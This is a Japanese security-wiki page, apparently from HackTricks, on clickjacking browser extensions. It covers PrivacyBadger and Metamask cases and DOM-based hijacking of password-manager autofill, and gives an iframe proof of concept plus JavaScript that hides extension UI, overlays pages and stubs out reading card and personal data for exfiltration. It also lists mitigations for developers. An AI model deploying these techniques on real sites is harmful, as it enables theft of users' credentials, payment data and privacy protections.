# BrowExt - ClickJacking

{{#include ../../banners/hacktricks-training.md}}

## 基本情報

このページではブラウザ拡張機能の ClickJacking 脆弱性を悪用します。  
ClickJacking が何かわからない場合は次を確認してください:

{{#ref}}
../clickjacking.md
{{#endref}}

拡張機能はファイル **`manifest.json`** を含み、その JSON ファイルには `web_accessible_resources` フィールドがあります。以下は [the Chrome docs](https://developer.chrome.com/extensions/manifest/web_accessible_resources) がこの件について述べている内容です:

> これらのリソースは、URL **`chrome-extension://[PACKAGE ID]/[PATH]`** を介してウェブページで利用可能になり、これは **`extension.getURL method`** で生成できます。許可リストに登録されたリソースは適切な CORS ヘッダと共に提供されるため、XHR のような仕組みで利用可能です。[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

ブラウザ拡張機能の **`web_accessible_resources`** は単にウェブ経由でアクセス可能なだけでなく、拡張機能固有の権限で動作します。つまり、次のことが可能です：

- 拡張機能の状態を変更する
- 追加のリソースを読み込む
- ある程度ブラウザとやり取りする

しかしながら、この機能はセキュリティリスクを伴います。**`web_accessible_resources`** 内のリソースが重要な機能を持っている場合、攻撃者はそのリソースを外部のウェブページに埋め込む可能性があります。そのページを訪れた無防備なユーザーが意図せずその埋め込まれたリソースを作動させてしまうかもしれません。そのような作動は、拡張機能の権限や機能に応じて予期しない結果を引き起こす可能性があります。

## PrivacyBadger の例

拡張機能 PrivacyBadger では、`skin/` ディレクトリが `web_accessible_resources` として次のように宣言されていたことに関連する脆弱性が確認されました (Check the original [blog post](https://blog.lizzie.io/clickjacking-privacy-badger.html)):
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
この設定は潜在的なセキュリティ問題を引き起こしました。具体的には、ブラウザでPrivacyBadgerアイコンを操作した際に表示される`skin/popup.html`ファイルが`iframe`に埋め込まれる可能性がありました。この埋め込みは、ユーザーを欺いて意図せずに "Disable PrivacyBadger for this Website" をクリックさせるために悪用され得ます。そうした操作はPrivacyBadgerの保護を無効化し、ユーザーのプライバシーを損ない追跡増加のリスクにさらす可能性があります。ClickJackingのデモは[**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm)で確認できます。

この脆弱性に対処するため、単純な解決策が実施されました：`web_accessible_resources`のリストから`/skin/*`を削除することです。この変更により、`skin/`ディレクトリのコンテンツがweb-accessibleなリソースを通じてアクセスまたは操作されることがなくなり、リスクが効果的に軽減されました。

修正は簡単でした: **remove `/skin/*` from the `web_accessible_resources`.**

### PoC
```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}
</style>

<div id="stuff">
<h1>Click the button</h1>
<button id="button">click me</button>
</div>

<iframe
src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Metamask の例

[**Metamask における ClickJacking の blog post はこちら**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)。このケースでは、Metamask はアクセスに使われるプロトコルが **`https:`** または **`http:`**（例えば **`chrome:`** ではない）であることをチェックすることで脆弱性を修正しました:

<figure><img src="../../images/image (21).png" alt=""><figcaption></figcaption></figure>

Metamask 拡張で修正されたもう一つの ClickJacking は、ユーザがページが phishing と疑われる場合でも **クリックしてホワイトリストに追加（Click to whitelist）** できてしまう点でした。`“web_accessible_resources”: [“inpage.js”, “phishing.html”]` のように設定されていると、そのページは ClickJacking に弱く、攻撃者は被害者に気づかれないように普通のものを表示してホワイトリスト追加をクリックさせ、その後 phishing ページに戻してホワイトリスト化されたページを使うことができました。

## Steam Inventory Helper の例

ブラウザ拡張の **XSS** が **ClickJacking** 脆弱性とどのようにチェーンされたかは、次のページを確認してください:


{{#ref}}
browext-xss-example.md
{{#endref}}

---

## DOM-based extension Clickjacking（Password Manager の Autofill UI）

従来の extension Clickjacking は misconfigured な `web_accessible_resources` を悪用して特権のある HTML を iframe 化し、ユーザのクリックを誘導します。新しいクラスである DOM-based extension Clickjacking は、password manager がページの DOM に直接注入する autofill ドロップダウンを狙い、CSS/DOM トリックでそれらを隠したり覆い隠したりしつつクリック可能な状態を維持します。強制された１回のクリックで保存された項目が選択され、攻撃者が制御する入力欄に機密データが自動入力されます。

### Threat model

- 攻撃者はウェブページをコントロールしている（または関連ドメインでの XSS / subdomain takeover / cache poisoning を達成している）。
- 被害者は password manager 拡張をインストールしてアンロックしている（nominal に locked の状態でも一部の autofill は動作することがある）。
- 少なくとも１回のユーザクリックが誘導される（オーバーレイされた cookie banners、ダイアログ、CAPTCHAs、ゲームなど）。

### Attack flow (manual autofill)

1. 視認できないがフォーカス可能なフォーム（login / PII / credit-card フィールド）を注入する。
2. 入力欄にフォーカスして、拡張の autofill ドロップダウンをフィールドの近くに表示させる。
3. 拡張の UI を隠すか覆い隠しつつ、インタラクション可能な状態を維持する。
4. 隠されたドロップダウンの下に信憑性のある操作要素を配置し、項目を選択させるクリックを強制する。
5. 攻撃者のフォームから入力された値を読み取り、持ち出す。

### How to hide the autofill UI

- Extension element
- Root element opacity (generic):
```js
// Reduce or nullify opacity of the extension root
// Works when the root element is attached in the page DOM
const root = document.querySelector('protonpass-root')
if (root) root.style.opacity = 0
```
- open ShadowRoot 内の子要素 (dynamic tag、内部の iframe を隠す):
```js
// Find dynamic root like <protonpass-root-xyz> and hide its child iframe
const root = Array.from(document.querySelectorAll('*'))
.find(el => el.tagName.toLowerCase().startsWith('protonpass-root-'))
if (root?.shadowRoot) {
const frame = root.shadowRoot.querySelector('iframe')
if (frame) frame.style.cssText += 'opacity:0 !important;'
}
```
- 親要素
- BODY/HTML の opacity トリックで、ページは通常どおりに見えるまま拡張機能の UI を不可視化する（例: スクリーンショットの背景）：
```js
// Hide full page, then reveal a tiny amount to keep clicks working
document.body.style.opacity = 0
// Optional: Show a screenshot/lookalike to avoid a blank screen
// document.documentElement.style.backgroundImage = 'url(website.png)'

// Inject a credit-card form and focus to trigger dropdown
/* create #cardform with #cardnumber, #expiry, #cvc */
document.getElementById('cardnumber').focus()
// Make body barely visible to allow user interaction
document.body.style.opacity = '0.001'

function getCardValues() {
const num = document.getElementById('cardnumber').value
const exp = document.getElementById('expiry').value
const cvc = document.getElementById('cvc').value
// exfiltrate via XHR/fetch/websocket
}
```
- オーバーレイ
- 部分的なオーバーレイ: ドロップダウンがクリック可能なままになるよう、数ピクセルだけを残してそれ以外を覆う（攻撃者オーバーレイが DOM の最後で max z-index を持つことを確認する、または Top Layer を使用）。
- 全面オーバーレイ: pointer-events:none を使用してクリックを隠れたドロップダウンに通し、Popover API でそれを持続させる:
```html
<div id="overlay" popover style="pointer-events:none;">Cookie consent</div>
<script>
overlay.showPopover()
// Inject a personal data form and focus to trigger dropdown
/* create #personalform with #name/#email/#phone/... */
document.getElementById('name').focus()
function getData(){ /* read + exfil values on change */ }
</script>
```
### 被害者のクリックの配置

- Fixed placement: 隠したドロップダウンを「Accept cookies」や「Close」、またはCAPTCHAのチェックボックスのような信頼できるコントロールの下に配置する。
- Follow-mouse: フォーカスされた入力をカーソルの下に移動させてドロップダウンが追従するようにし、定期的に再フォーカスしてどこをクリックしても単一のクリックで項目が選択されるようにする:
```js
const f = document.getElementById('name')
document.addEventListener('mousemove', e => {
personalform.style = `top:${e.pageY-50}px;left:${e.pageX-100}px;position:absolute;`
// some managers hide the dropdown if focus is lost; refocus slowly
setTimeout(() => f.focus(), 100)
})
```
### Impact and scenarios

- Attacker-controlled site: 強制的なクリック一回で credit card data (number/expiry/CVC) や個人情報 (name, email, phone, address, DOB) をドメインスコープ外から exfiltrate できる可能性がある。
- Trusted site with XSS/subdomain takeover/cache poisoning: 複数回のクリックで credentials (username/password) や TOTP を盗まれる可能性がある。多くの managers は関連するサブドメイン／親ドメイン（例: `*.example.com`）間で autofill するため。
- Passkeys: RP が WebAuthn challenges をセッションにバインドしていない場合、XSS により署名済みアサーションを傍受される可能性がある；DOM-based clickjacking は passkey のプロンプトを隠してユーザーの承認クリックを誘発する。

### Limitations

- 少なくとも一度のユーザークリックと適切なピクセルアライメントが必要（現実的なオーバーレイはクリックを誘導しやすい）。
- Auto-lock/logout により悪用可能な時間窓は短くなる；一部の managers は「locked」状態でも autofill することがある。

### Extension developer mitigations

- Autofill UI を Top Layer (Popover API) でレンダリングするか、ページのスタッキングより上に確実に配置するようにし、ページ制御のオーバーレイで覆われないようにする。
- CSS の改変に耐性を持たせる: Closed Shadow DOM を優先し、UI ルートの疑わしいスタイル変更を `MutationObserver` で監視する。
- 填充前に敵対的なオーバーレイを検出する: 他の top-layer/popover 要素を列挙し、一時的に `pointer-events:none` を無効化し、`elementsFromPoint()` を使って遮蔽を検出する；オーバーレイが存在する場合は UI を閉じる。
- レンダリングの前後で `<body>`/`<html>` の不審な opacity やスタイル変更を検出する。
- iframe ベースの問題に対して: MV3 の `web_accessible_resources` の `matches` を狭く絞り、HTML UI を公開しないようにする；どうしても HTML を公開する必要がある場合は `X-Frame-Options: DENY` または `Content-Security-Policy: frame-ancestors 'none'` を返す。

## References

- [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)
- [https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)

{{#include ../../banners/hacktricks-training.md}}
